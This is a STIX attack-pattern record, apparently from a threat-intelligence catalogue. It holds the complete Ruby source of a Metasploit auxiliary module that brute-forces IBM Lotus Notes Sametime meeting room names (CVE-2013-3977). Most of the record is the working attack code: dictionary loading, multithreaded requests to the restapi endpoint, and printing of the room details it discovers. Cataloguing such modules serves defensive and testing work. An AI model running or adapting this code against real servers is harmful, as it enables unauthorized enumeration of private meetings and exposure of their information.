{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2b266e09-96a7-4e31-b942-eaaf98187be7",
    "created": "2024-08-14T16:32:01.238589Z",
    "modified": "2024-08-14T16:32:01.238593Z",
    "name": "IBM Lotus Notes Sametime Room Name Bruteforce",
    "description": " This module bruteforces Sametime meeting room names via the IBM Lotus Notes Sametime web interface. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/ibm_sametime_room_brute.rb",
            "external_id": "ibm_sametime_room_brute.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-3977"
        },
        {
            "source_name": "reference",
            "url": "http://www-01.ibm.com/support/docview.wss?uid=swg21671201"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'enumerable'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'IBM Lotus Notes Sametime Room Name Bruteforce',\n      'Description'    => %q{\n        This module bruteforces Sametime meeting room names via the IBM\n        Lotus Notes Sametime web interface.\n      },\n      'Author'         =>\n        [\n          'kicks4kittens' # Metasploit module\n        ],\n      'References' =>\n        [\n          [ 'CVE', '2013-3977' ],\n          [ 'URL', 'http://www-01.ibm.com/support/docview.wss?uid=swg21671201']\n        ],\n      'DefaultOptions' =>\n        {\n          'SSL' => true\n        },\n      'License'        => MSF_LICENSE,\n      'DisclosureDate' => '2013-12-27'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptString.new('OWNER', [ true,  'The owner to bruteforce meeting room names for', '']),\n        OptPath.new('DICT', [ true,  'The path to the userinfo script' ]),\n        OptString.new('TARGETURI', [ true, 'Path to stmeetings', '/stmeetings/'])\n      ])\n\n    register_advanced_options(\n      [\n        OptInt.new('TIMING', [ true,  'Set pause between requests', 0]),\n        OptInt.new('Threads', [ true,  'Number of test threads', 10])\n      ])\n  end\n\n  def run\n    print_status(\"Beginning IBM Lotus Notes Sametime Meeting Room Bruteforce\")\n    print_status(\"Using owner: #{datastore['OWNER']}\")\n\n    # test for expected response code on non-existant meeting room name\n    rval = Rex::Text.rand_text_alpha(64)\n    uri = target_uri.path\n    @reqpath = normalize_uri(uri, '/restapi')\n\n    res = send_request_cgi({\n      'uri'     =>  @reqpath,\n      'method'  => 'GET',\n      'ctype'   => 'text/html',\n      'vars_get' => {\n        'owner' => datastore['OWNER'],\n        'permaName' => rval\n        }\n    })\n\n    unless res\n      print_error(\"No response, timeout\")\n      return\n    end\n\n    if res.code == 404 and res.body =~ /Room does not exist/i\n      vprint_status(\"Server responding to restapi requests as expected\")\n    else\n      print_error(\"Unexpected response from server (#{res.code}). Exiting...\")\n      return\n    end\n\n    # create initial test queue and populate\n    @test_queue = Queue.new\n    @output_lock = false\n\n    # TODO: If DICT is unreadable (missing, etc) this will stack trace.\n    ::File.open(datastore['DICT']).each { |line| @test_queue.push(line.chomp) }\n    vprint_status(\"Loaded #{@test_queue.length} values from dictionary\")\n\n    print_status(\"Beginning dictionary bruteforce using (#{datastore['Threads']} Threads)\")\n\n    while(not @test_queue.empty?)\n      t = []\n      nt = datastore['Threads'].to_i\n      nt = 1 if nt <= 0\n\n      if @test_queue.length < nt\n        # work around issue where threads not created as the queue isn't large enough\n        nt = @test_queue.length\n      end\n\n      begin\n        1.upto(nt) do\n          t << framework.threads.spawn(\"Module(#{self.refname})-#{rhost}\", false, @test_queue.shift) do |test_current|\n            Thread.current.kill if not test_current\n            res = make_request(test_current)\n            if res.nil?\n              print_error(\"Timeout from server when testing room \\\"#{test_current}\\\"\")\n            elsif res and res.code == 404\n              vprint_status(\"Room \\\"#{test_current}\\\" was not valid for owner #{datastore['OWNER']}\")\n            else\n              # check response for user data\n              check_response(res, test_current)\n            end\n          end\n        end\n      t.each {|x| x.join }\n\n      rescue ::Timeout::Error\n      ensure\n        t.each {|x| x.kill rescue nil }\n      end\n    end\n  end\n\n  # make request and return response\n  def make_request(test_current)\n    # Apply timing information\n    if datastore['TIMING'] > 0\n      Rex::sleep(datastore['TIMING'])\n    end\n\n    res = send_request_cgi({\n      'uri'     =>  @reqpath,\n      'method'  => 'GET',\n      'ctype'   => 'text/html',\n      'vars_get' =>\n        {\n          'owner' => datastore['OWNER'],\n          'permaName' => test_current\n        }\n    })\n  end\n\n  # check the response for valid room information\n  def check_response(res, test_current)\n    begin\n      if res.code.to_i == 200\n        json_room = JSON.parse(res.body)\n        # extract room information if there is data\n        output_table(json_room, test_current) unless json_room.blank?\n      end\n    rescue JSON::ParserError\n      # non-JSON response - server may be overloaded\n      return\n    end\n  end\n\n  def output_table(room_info, test_current)\n\n    print_good(\"New meeting room found: #{test_current}\")\n\n    # print output table for discovered meeting rooms\n    roomtbl = Msf::Ui::Console::Table.new(\n      Msf::Ui::Console::Table::Style::Default,\n        'Header'  => \"[IBM Lotus Sametime] Meeting Room #{test_current}\",\n        'Prefix'  => \"\",\n        'Postfix' => \"\\n\",\n        'Indent'  => 1,\n        'Columns' =>\n          [\n            \"Key\",\n            \"Value\"\n          ]\n      )\n\n    room_info['results'][0].each do |k, v|\n      if v.is_a?(Hash)\n        # breakdown Hash\n        roomtbl << [ k.to_s, '>>' ] # title line\n        v.each do | subk, subv |\n          roomtbl << [ \"#{k.to_s}:#{subk.to_s}\", subv.to_s || \"-\"]  if not v.nil? or v.empty?\n        end\n      else\n        roomtbl << [ k.to_s, v.to_s || \"-\"]  unless v.nil?\n      end\n    end\n    # output table\n    print_good(roomtbl.to_s)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-12-27"
}